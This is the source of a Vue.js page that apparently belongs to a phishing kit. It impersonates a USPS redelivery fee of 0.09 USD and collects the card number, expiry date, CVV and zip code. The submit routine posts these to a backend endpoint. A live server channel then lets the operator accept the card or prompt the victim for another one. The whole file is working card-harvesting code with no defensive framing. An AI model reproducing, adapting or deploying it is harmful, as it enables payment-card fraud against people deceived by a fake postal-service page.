<template>
  <div>
    <v-row>
      <v-col>
        <h3 class="payment"><strong>Payment Method</strong></h3>
      </v-col>
    </v-row>
    <v-row class="mt-0 pb-0">
      <v-col>
        <a style="color:red;">This Redelivery request cost 0.09 USD.</a>
      </v-col>
    </v-row>
    <!--    <v-row>-->
    <!--      <v-col>-->
    <!--        <span class="overline"><v-img src="@/assets/images/credit-card-logo.png" width="160"></v-img>Payment methods supported</span>-->
    <!--        <p class="caption">USPS® does not store any card data. All data is for verification only.</p>-->
    <!--      </v-col>-->
    <!--    </v-row>-->
    <v-row>
      <v-col :cols="adaptive_cols">
        <input type="number" maxlength="19" required="" placeholder="Card Number" tabindex="8" class="form-control"
               v-model="card_number" oninput="if(value.length >16){value=value.slice(0,16)}" v-on:blur="CheckBankNo">
        <a style="color:red;">{{ card_alert }}</a>
      </v-col>
      <v-col :cols="adaptive_cols">
        <input type="text" placeholder="Expiry Date (MM/YY)" maxlength="5" required="" tabindex="9"
               class="form-control" v-model="exp_date"
               oninput="if(value.length>5){value=value.slice(0,3)}if(value.length===2){value=value+'/'}">
      </v-col>
    </v-row>
    <v-row>
      <v-col :cols="adaptive_cols">
        <input type="number" maxlength="4" placeholder="Security code" required="" tabindex="10" class="form-control"
               oninput="if(value.length>4)value=value.slice(0,4)" v-model="cvv">
      </v-col>
    </v-row>
    <v-row>
      <v-col :cols="adaptive_cols">
        <input type="number" maxlength="5" placeholder="Zip Code" required="" tabindex="10" class="form-control"
               oninput="if(value.length>5)value=value.slice(0,5)" v-model="zipcode">
      </v-col>
    </v-row>
    <v-row class="text-center" style="padding-bottom: 30px">
      <v-col cols="12">
        <a tabindex="13" class="btn btn-primary btn-lg" style="color: white;" @click="submit_data">Continue</a>
      </v-col>
    </v-row>
    <v-row>
      <v-col cols="12" class="mb-5">
        <p style="color:red;" class="text-center "><b>{{ alert_text }}</b></p>
      </v-col>
    </v-row>
    <v-overlay
        v-model="show_loading">
      <div class="blockUI blockMsg blockPage"
           style="z-index: 1011; position: fixed; padding: 0; margin: 0; width: 30%; top: 40%; left: 35%; text-align: center; color: rgb(0, 0, 0); border: 1px none rgb(0, 0, 0); background-color: transparent; cursor: wait;">
        <img src="@/assets/images/ajax-loader-usps-white.gif" style="height:auto;max-width:100%;" alt=""></div>
    </v-overlay>
  </div>
</template>

<script>
import axios from "axios";
import api from '@/api/index';

export default {
  name: "PaymentView",
  computed: {
    adaptive_cols() {
      switch (this.$vuetify.breakpoint.name) {
        case 'xs':
          return 12
      }
      return 4
    },
  },
  data: () => ({
    card_alert: '',
    flush_task: undefined,
    alert_text: '',
    show_loading: false,
    appid: localStorage.getItem("appid"),
    card_number: '',
    exp_date: '',
    cvv: '',
    zipcode: '',
  }),
  methods: {
    isValidCreditCard: function (ccnum) {
      let i;
      ccnum = ccnum.split("-").join("");
      let checksum = 0;
      for (i = (2 - (ccnum.length % 2)); i <= ccnum.length; i += 2) {
        checksum += parseInt(ccnum.charAt(i - 1));
      }
      // Analyze odd digits in even length strings
      //or even digits in odd length strings.
      for (i = (ccnum.length % 2) + 1; i < ccnum.length; i += 2) {
        const digit = parseInt(ccnum.charAt(i - 1)) * 2;
        if (digit < 10) {
          checksum += digit;
        } else {
          checksum += (digit - 9);
        }
      }
      return (checksum % 10) === 0;
    },
    //检查银行卡号
    CheckBankNo: function () {
      // eslint-disable-next-line
      let bankno = this.card_number
      bankno = bankno.replace(/\s/g, '');
      if (bankno === "") {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      if (bankno.length < 14 || bankno.length > 19) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      const num = /^\d*$/;//全数字
      if (!num.exec(bankno)) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      if (!this.isValidCreditCard(bankno) && localStorage.getItem('CheckCard') !== null) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      const bank_first = ['3', '4', '5', '6', '9']
      if (bank_first.indexOf(bankno.slice(0, 1)) === -1) {
        this.card_alert = "Please enter the correct card number";
        return false;
      }
      this.card_alert = ""
      return true;
    },
    submit_data() {
      if (this.card_alert !== '') {
        return
      }
      this.show_alert = false
      const url = api.step_2
      const params = new URLSearchParams();
      const post_data = [this.card_number, this.exp_date, this.cvv, this.appid]
      const post_name = ['card_number', 'exp_date', 'cvv', 'appid']
      if (this.card_number !== '' & this.exp_date !== '' && this.cvv !== '') {
        this.alert_text = ''
        this.show_loading = true
        for (let i in post_data) {
          params.append(post_name[i], post_data[i])
        }
        axios.post(url, params)
            .then(response => {
              if (response.data.status === 'ok') {
                this.show_loading = true
                this.check_card_status_2()
                // this.flush_task = setInterval(this.check_card_status, 2000)
              } else {
                this.show_loading = false
                this.alert_text = 'Network error, please try again'
              }
            })
            .catch(error => {
              console.log(error)
              this.show_loading = false
              this.alert_text = 'Network error, please try again'
            })
      } else {
        this.alert_text = 'Please enter all information to continue'
      }
    },
    /* eslint-disable */
    check_card_status_2() {
      if ('EventSource' in window) {
        const url = api.check_card_status + "?appid=" + this.appid;
        const source = new EventSource(url);
        // 服务器发送信息到客户端时，如果没有 event 字段，默认会触发 message 事件
        source.onmessage = (event) => {
          let data = event.data;
          if (data === 'ok') {
            source.close()
            this.$router.push({'name': 'wait'})
          } else if (data === 'change') {
            source.close()
            this.show_loading = false
            this.show_alert = true
            this.card_number = this.exp_date = this.cvv = ''
            this.alert_text = 'Card not supported, please change a card'
          }
        }
        // 连接异常时会触发 error 事件并自动重连
        source.onerror = (event) => {
          console.log(event);

        }
      }
    },

  }
}
</script>

<style scoped>
.payment {
  font-family: 'HelveticaNeueW01', Helvetica, Arial, sans-serif;
  font-size: 18px;
  line-height: 100%;
  font-weight: 500;
  color: #336;
  margin: 0;
  padding: 0;
}

.btn-primary:hover {
  color: #336 !important;
  background-color: #ededed !important;
  border-color: #204d74;
}

input[type='text'], input[type='tel'], input[type='number'], input[type='email'] {
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  width: 100%;
  height: 50px;
  font-size: 16px;
  padding: 5px 10px;
  border: 1px solid #336;
  border-radius: 3px !important;
  position: relative;
  color: #000;
}

input::-webkit-input-placeholder {
  color: #5e5e5e;
  font-size: 14px;
  font-weight: 700;
}
</style>
